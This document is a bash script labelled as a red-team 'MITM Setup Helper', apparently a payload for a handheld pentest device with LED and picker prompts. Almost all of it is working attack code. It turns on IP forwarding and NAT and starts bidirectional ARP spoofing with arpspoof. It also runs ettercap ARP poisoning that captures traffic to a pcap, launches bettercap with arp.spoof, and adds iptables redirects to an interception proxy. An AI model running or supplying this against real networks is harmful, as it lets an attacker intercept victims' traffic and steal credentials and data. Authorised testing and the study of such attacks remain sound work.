#!/bin/bash
# Title: MITM Setup Helper
# Description: Configure network for man-in-the-middle attacks
# Author: Red Team Toolkit
# Version: 1.0
# Category: interception
# Net Mode: NAT
#
# LED States
# - Blue slow blink: Configuring
# - Amber: Setting up routing
# - Cyan: MITM active
# - Green: Setup complete
# - Red: Error

set -euo pipefail

ARTIFACTS_DIR="${ARTIFACTS_DIR:-/tmp/mitm-setup}"
LOG_FILE="$ARTIFACTS_DIR/mitm.log"

have() { command -v "$1" >/dev/null 2>&1; }

cleanup() {
  if [[ "${CLEANUP_ON_EXIT:-1}" == "1" ]]; then
    disable_forwarding
    flush_iptables
  fi
  LED OFF
}
trap cleanup EXIT

log_action() {
  local msg="$1"
  echo "[$(date '+%H:%M:%S')] $msg" >> "$LOG_FILE"
  LOG "$msg"
}

get_interfaces() {
  ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -v '^lo$' | head -10
}

get_default_gw() {
  ip route 2>/dev/null | awk '/default/ {print $3}' | head -1
}

get_interface_ip() {
  local iface="$1"
  ip -o -4 addr show "$iface" 2>/dev/null | awk '{print $4}' | cut -d'/' -f1 | head -1
}

enable_forwarding() {
  log_action "Enabling IP forwarding..."
  echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
}

disable_forwarding() {
  echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
}

flush_iptables() {
  iptables -t nat -F 2>/dev/null || true
  iptables -F FORWARD 2>/dev/null || true
}

setup_nat() {
  local out_iface="$1"
  log_action "Setting up NAT on $out_iface..."
  
  iptables -t nat -A POSTROUTING -o "$out_iface" -j MASQUERADE
  iptables -A FORWARD -i "$out_iface" -o "$out_iface" -m state --state RELATED,ESTABLISHED -j ACCEPT
  iptables -A FORWARD -j ACCEPT
}

setup_port_redirect() {
  local src_port="$1"
  local dst_port="$2"
  local proto="${3:-tcp}"
  
  log_action "Redirecting $proto port $src_port -> $dst_port"
  iptables -t nat -A PREROUTING -p "$proto" --dport "$src_port" -j REDIRECT --to-port "$dst_port"
}

arp_spoof_start() {
  local target="$1"
  local gateway="$2"
  local iface="$3"
  
  if ! have arpspoof; then
    log_action "arpspoof not available"
    return 1
  fi
  
  log_action "Starting ARP spoof: $target <-> $gateway"
  
  arpspoof -i "$iface" -t "$target" "$gateway" >/dev/null 2>&1 &
  echo $! > "$ARTIFACTS_DIR/arp1.pid"
  
  arpspoof -i "$iface" -t "$gateway" "$target" >/dev/null 2>&1 &
  echo $! > "$ARTIFACTS_DIR/arp2.pid"
  
  log_action "ARP spoof running (PIDs in $ARTIFACTS_DIR/*.pid)"
}

arp_spoof_stop() {
  for pidfile in "$ARTIFACTS_DIR"/*.pid; do
    [[ -f "$pidfile" ]] || continue
    local pid
    pid=$(cat "$pidfile")
    kill "$pid" 2>/dev/null || true
    rm -f "$pidfile"
  done
  log_action "ARP spoof stopped"
}

ettercap_mitm() {
  local target1="$1"
  local target2="$2"
  local iface="$3"
  
  if ! have ettercap; then
    log_action "ettercap not available"
    return 1
  fi
  
  log_action "Starting ettercap MITM..."
  
  ettercap -T -q -i "$iface" -M arp:remote "/$target1//" "/$target2//" \
    -w "$ARTIFACTS_DIR/ettercap_capture.pcap" &
  echo $! > "$ARTIFACTS_DIR/ettercap.pid"
  
  log_action "ettercap running"
}

bettercap_mitm() {
  local iface="$1"
  
  if ! have bettercap; then
    log_action "bettercap not available"
    return 1
  fi
  
  log_action "Starting bettercap..."
  
  bettercap -iface "$iface" -eval "net.probe on; net.recon on; arp.spoof on" &
  echo $! > "$ARTIFACTS_DIR/bettercap.pid"
  
  log_action "bettercap running"
}

show_status() {
  LOG ""
  LOG blue "=== MITM Status ==="
  
  local fwd
  fwd=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "?")
  LOG "IP Forwarding: $fwd"
  
  LOG ""
  LOG "NAT rules:"
  iptables -t nat -L -n 2>/dev/null | head -15
  
  LOG ""
  LOG "Running processes:"
  for pidfile in "$ARTIFACTS_DIR"/*.pid; do
    [[ -f "$pidfile" ]] || continue
    local name pid
    name=$(basename "$pidfile" .pid)
    pid=$(cat "$pidfile")
    if kill -0 "$pid" 2>/dev/null; then
      LOG green "  $name: PID $pid (running)"
    else
      LOG red "  $name: PID $pid (stopped)"
    fi
  done
}

main() {
  LOG blue "=== MITM Setup Helper ==="
  LOG "Configure network for interception"
  LOG ""
  
  mkdir -p "$ARTIFACTS_DIR"
  
  LED B SLOW
  
  LOG "Available interfaces:"
  local ifaces
  ifaces=$(get_interfaces)
  echo "$ifaces" | head -5
  LOG ""
  
  local gw
  gw=$(get_default_gw)
  LOG "Default gateway: ${gw:-not found}"
  LOG ""
  
  LOG "Setup mode:"
  LOG "1. Quick NAT setup (IP forwarding + masquerade)"
  LOG "2. ARP spoof (arpspoof)"
  LOG "3. Ettercap MITM"
  LOG "4. Bettercap MITM"
  LOG "5. Port redirect (for proxy)"
  LOG "6. Show status"
  LOG "7. Cleanup/disable"
  LOG ""
  
  local mode
  mode=$(NUMBER_PICKER "Mode (1-7)" 1) || true
  case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
      LOG "Cancelled"; exit 1 ;;
  esac
  
  case "$mode" in
    1)
      local out_iface
      out_iface=$(TEXT_PICKER "Outbound interface" "eth0") || true
      [[ -z "$out_iface" ]] && { LOG "Cancelled"; exit 1; }
      
      LED Y SOLID
      enable_forwarding
      setup_nat "$out_iface"
      
      LED C SOLID
      log_action "NAT active on $out_iface"
      
      CLEANUP_ON_EXIT=0
      LOG green "MITM ready - traffic will be forwarded"
      ;;
      
    2)
      local iface target gateway
      iface=$(TEXT_PICKER "Interface" "wlan0") || true
      target=$(IP_PICKER "Target IP" "192.168.1.100") || true
      gateway=$(IP_PICKER "Gateway IP" "${gw:-192.168.1.1}") || true
      
      [[ -z "$iface" || -z "$target" || -z "$gateway" ]] && { LOG "Cancelled"; exit 1; }
      
      LED Y SOLID
      enable_forwarding
      
      LED C SLOW
      arp_spoof_start "$target" "$gateway" "$iface"
      
      CLEANUP_ON_EXIT=0
      LOG green "ARP spoof active"
      LOG "Target: $target <-> Gateway: $gateway"
      ;;
      
    3)
      local iface target1 target2
      iface=$(TEXT_PICKER "Interface" "wlan0") || true
      target1=$(IP_PICKER "Target 1" "192.168.1.100") || true
      target2=$(IP_PICKER "Target 2 (gateway)" "${gw:-192.168.1.1}") || true
      
      [[ -z "$iface" || -z "$target1" || -z "$target2" ]] && { LOG "Cancelled"; exit 1; }
      
      LED Y SOLID
      enable_forwarding
      
      LED C SLOW
      ettercap_mitm "$target1" "$target2" "$iface"
      
      CLEANUP_ON_EXIT=0
      LOG green "Ettercap MITM active"
      ;;
      
    4)
      local iface
      iface=$(TEXT_PICKER "Interface" "wlan0") || true
      [[ -z "$iface" ]] && { LOG "Cancelled"; exit 1; }
      
      LED Y SOLID
      enable_forwarding
      
      LED C SLOW
      bettercap_mitm "$iface"
      
      CLEANUP_ON_EXIT=0
      LOG green "Bettercap MITM active"
      ;;
      
    5)
      local src_port dst_port proto
      src_port=$(NUMBER_PICKER "Source port" 80) || true
      dst_port=$(NUMBER_PICKER "Redirect to port" 8080) || true
      proto=$(TEXT_PICKER "Protocol (tcp/udp)" "tcp") || true
      
      LED Y SOLID
      setup_port_redirect "$src_port" "$dst_port" "$proto"
      
      CLEANUP_ON_EXIT=0
      LOG green "Port redirect active: $src_port -> $dst_port"
      ;;
      
    6)
      show_status
      ;;
      
    7)
      LED Y SOLID
      arp_spoof_stop
      flush_iptables
      disable_forwarding
      
      LED G SOLID
      LOG green "MITM disabled, cleanup complete"
      ;;
  esac
  
  LOG ""
  log_action "Setup complete"
  
  PROMPT "Press button to exit"
}

main "$@"
